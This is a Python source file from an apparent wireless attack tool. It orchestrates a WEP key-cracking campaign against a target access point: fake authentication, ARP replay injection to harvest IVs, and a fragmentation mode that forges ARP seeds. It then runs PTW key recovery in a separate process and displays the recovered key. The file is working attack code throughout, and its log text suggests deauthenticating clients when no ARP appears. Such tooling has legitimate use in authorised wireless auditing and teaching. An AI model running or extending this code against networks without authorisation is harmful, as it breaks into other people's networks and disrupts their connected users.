"""WEP "Generate IVs" campaign orchestrator.

The single thing the Generate IVs button drives. For M3 it's the two
near-term rungs of the escalation ladder:

    1. fake-auth  — associate so the AP accepts our injections
    2. ARP replay — capture an ARP passively, replay it for fresh IVs

Future milestones extend this: when no ARP turns up, M5/M6 will run
fragmentation / chopchop to *forge* one (pausing replay so only one TX
activity uses the radio at a time), then hand the forged ARP back to replay.
That's why replay lives behind ``pause()``/``resume()`` and the campaign — not
the button — owns the "only one TX activity at once" rule.

Coordination falls out naturally: replay only bursts while fake-auth reports
``associated`` (via the ``can_inject`` gate), so if the AP kicks us mid-replay
the reactive re-auth kicks in, replay goes quiet, and resumes once we're back
in. The loop self-heals.
"""

from __future__ import annotations

import asyncio
import logging
from concurrent.futures import ProcessPoolExecutor
from typing import Callable, Optional

from wifit3.engine.models import AccessPoint
from wifit3.engine.attacks.wep.fake_auth import WepFakeAuth
from wifit3.engine.attacks.wep.arp_replay import WepArpReplay
from wifit3.engine.attacks.wep.fragmentation import WepFragmentation
from wifit3.engine.attacks.wep.crack import (
    PtwCracker,
    keystream_from_arp_cipher,
)

logger = logging.getLogger(__name__)


def _key_markup(key: bytes) -> str:
    """The recovered key as an unmissable black-on-cyan block (matching the
    Focus CAPTURE panel), with the ASCII form when it's a printable word."""
    ascii_hint = (
        f' = "{key.decode("ascii")}"' if all(0x20 <= b < 0x7F for b in key) else ""
    )
    return f"[bold black on cyan] ✓ WEP KEY: {key.hex()}{ascii_hint} [/bold black on cyan]"


class WepCampaign:
    """Owns the fake-auth + ARP-replay lifecycle for one WEP target."""

    # Quiet window (no TX) after a frag success before replay resumes — a
    # diagnostic to watch the AP's rebroadcast queue drain to zero. See
    # _on_frag_success.
    _FRAG_DRAIN_S = 10.0

    def __init__(
        self,
        iface,
        target: AccessPoint,
        log_callback: Optional[Callable[[str], None]] = None,
    ):
        self.iface = iface
        self.target = target
        self._log = log_callback or (lambda _m: None)
        self._active = False

        # Native PTW cracker, fed incrementally from the store's crack samples
        # (votes are additive) and re-attempted as more IVs arrive.
        self.cracker = PtwCracker()
        self.recovered_key: Optional[bytes] = None
        self._crack_cursor = 0
        self._crack_started = False
        self._crack_task: Optional[asyncio.Task] = None
        # The PTW search runs in a SEPARATE PROCESS — true parallelism past the
        # GIL, so it can peg a core without slowing the replay (which lives on
        # the main process's event loop + GIL-releasing USB I/O).
        self._crack_pool: Optional[ProcessPoolExecutor] = None

        # Frag/Chop are alternative "manufacture an ARP seed" sub-modes the
        # user toggles while the campaign runs. The campaign owns the "one TX
        # activity at a time" invariant by pausing replay around them.
        self.frag: Optional[WepFragmentation] = None
        # Pending "resume replay after the quiet drain" task (see
        # _on_frag_success); cancelled if the campaign stops or frag restarts.
        self._drain_task: Optional[asyncio.Task] = None

        self.fake_auth = WepFakeAuth(iface, target, log_callback=self._log)
        self.replay = WepArpReplay(
            iface,
            target,
            iface.wep_store,
            # Replays are re-addressed to come FROM our associated fake-auth STA.
            source_mac=self.fake_auth.source_mac,
            # Only burst while we're actually associated.
            can_inject=lambda: self.fake_auth.state == "associated",
            # Replay traffic keeps the association alive (suppresses the
            # disruptive periodic re-auth) ...
            notify_activity=self.fake_auth.notify_activity,
            # ... and a replay stall asks for an immediate re-auth instead of
            # discarding the (working) seed.
            request_reauth=self.fake_auth.request_reauth,
            log_callback=self._log,
        )

    def start(self) -> None:
        if self._active:
            return
        self._active = True
        self._log(
            "[bold cyan]→ Generate IVs[/bold cyan] — fake-auth + ARP replay "
            "starting. Replay holds until associated; deauth a client if no "
            "ARP appears."
        )
        self.fake_auth.start()
        self.replay.start()
        # One reusable worker process for the crack search (spawns lazily on
        # the first submit).
        self._crack_pool = ProcessPoolExecutor(max_workers=1)
        self._crack_task = asyncio.create_task(self._crack_loop())
        logger.info("[WEP-Campaign] Started on %s", self.target.bssid)

    def stop(self) -> None:
        if not self._active:
            return
        self._active = False
        if self._crack_task:
            self._crack_task.cancel()
            self._crack_task = None
        if self._crack_pool:
            # Don't block the UI waiting on an in-flight search — let the
            # worker process exit on its own.
            self._crack_pool.shutdown(wait=False, cancel_futures=True)
            self._crack_pool = None
        # Cancel a pending post-frag drain → resume task.
        if self._drain_task:
            self._drain_task.cancel()
            self._drain_task = None
        # Tear down a running frag sub-mode before the TX it shares the radio
        # with.
        if self.frag is not None:
            self.frag.stop()
            self.frag = None
        # Stop replay (TX) before fake-auth so we don't briefly inject while
        # de-registering the forged STA.
        self.replay.stop()
        self.fake_auth.stop()
        # Quiet when we stopped because we WON — the key + "press c to copy"
        # were already logged; "stopped" right after would read as a failure.
        if self.recovered_key is None:
            self._log("[bold red]✗ Generate IVs stopped.[/bold red]")
        logger.info("[WEP-Campaign] Stopped on %s", self.target.bssid)

    async def _crack_loop(self) -> None:
        """Feed new crack samples to the PTW cracker and re-attempt recovery as
        IVs accumulate. The search runs in a worker PROCESS (no GIL contention
        with replay). On success we stop the TX — once we have the key there's
        no reason to keep injecting."""
        loop = asyncio.get_event_loop()
        try:
            while self._active and self.recovered_key is None:
                await asyncio.sleep(3.0)
                samples = self.iface.wep_store.crack_samples(self.target.bssid)
                for iv, cipher in samples[self._crack_cursor:]:
                    self.cracker.feed(iv, keystream_from_arp_cipher(cipher))
                self._crack_cursor = len(samples)
                if not self.cracker.ready or self._crack_pool is None:
                    continue
                if not self._crack_started:
                    self._crack_started = True
                    self._log(
                        f"[cyan]→ Cracking[/cyan] — {self.cracker.sample_count:,} "
                        f"usable IVs (ARP) collected, attempting key recovery…"
                    )
                # Ship the (picklable) cracker to the worker; it runs the search
                # on a snapshot of the votes and returns the key, if any.
                try:
                    key = await loop.run_in_executor(
                        self._crack_pool, self.cracker.recover
                    )
                except Exception:
                    logger.exception("[WEP-Campaign] crack worker failed")
                    continue   # retry next tick on a fresh snapshot
                if key is not None:
                    self.recovered_key = key
                    self.target.wep_key = key   # persist on the AP (Save / UI)
                    self._log(f"{_key_markup(key)} [dim](press 'c' to copy)[/dim]")
                    # Done — stop transmitting (replay + fake-auth keepalive).
                    self.replay.stop()
                    self.fake_auth.stop()
                    return
        except asyncio.CancelledError:
            pass

    # ---- Fragmentation sub-mode --------------------------------------------

    def start_frag(self) -> None:
        """Switch to fragmentation: pause ARP replay (one TX activity at a time
        on the half-duplex radio) and run WepFragmentation. On success it hands
        back the AP's relayed ARP and we resume replay with the fresh seed; a
        barren round just keeps retrying (the daemon logs a tally) until the
        user stops or switches — never auto-stops."""
        if not self._active or self.frag is not None:
            return
        # Cancel any pending post-frag drain → resume (we're re-entering frag).
        if self._drain_task:
            self._drain_task.cancel()
            self._drain_task = None
        self._log("[dim]· debug: FRAG START — pausing replay, frag takes the "
                  "radio[/dim]")
        self.replay.pause()
        self.frag = WepFragmentation(
            self.iface,
            self.target,
            self.iface.wep_store,
            source_mac=self.fake_auth.source_mac,
            on_forged_arp=self._on_frag_success,
            can_inject=lambda: self.fake_auth.state == "associated",
            log_callback=self._log,
        )
        self.frag.start()

    def stop_frag(self) -> None:
        """User-driven stop of the frag sub-mode → hand the radio back to ARP
        replay (its locked-on seed, if any, survives)."""
        if self.frag is None:
            return
        self._log("[dim]· debug: FRAG STOP (user) — handing radio back to "
                  "replay[/dim]")
        self.frag.stop()
        self.frag = None
        self.replay.resume()

    def _on_frag_success(self, frame: bytes) -> None:
        """Frag produced a relay (already an ARP-sized broadcast → the capture
        store logged it as a replay seed). The daemon stopped itself.

        DIAGNOSTIC (per user, 2026-05-24): insert a quiet drain window — frag is
        stopped (not TXing) and replay STAYS paused — for `_FRAG_DRAIN_S`
        seconds before resuming replay. Watching IVs/sec fall to zero during
        this window confirms/refutes the "post-frag slowness = backlogged AP
        rebroadcast queue" theory: if replay then runs FAST off a drained queue,
        it's the queue; if it's still slow, the AP is degrading our STA (→ fresh
        MAC needed)."""
        self.frag = None
        self._log("[dim]· debug: FRAG SUCCESS — frag stopped[/dim]")
        self._log(
            f"[yellow]→ Draining frame queue: {self._FRAG_DRAIN_S:.0f}s quiet "
            f"(no TX) before replay — watch IVs/sec fall to 0[/yellow]"
        )
        self._drain_task = asyncio.create_task(self._resume_after_drain())

    async def _resume_after_drain(self) -> None:
        """Sleep the quiet drain window, then resume replay. Replay was paused
        by start_frag and stays paused until here — so nothing TXes meanwhile."""
        try:
            await asyncio.sleep(self._FRAG_DRAIN_S)
            if self._active:
                self._log(
                    "[green]→ Resuming ARP replay[/green] [dim](queue should be "
                    "drained; replaying the forged ARP)[/dim]"
                )
                self.replay.resume()
        except asyncio.CancelledError:
            pass

    @property
    def frag_active(self) -> bool:
        return self.frag is not None and self.frag.is_active

    @property
    def is_active(self) -> bool:
        return self._active
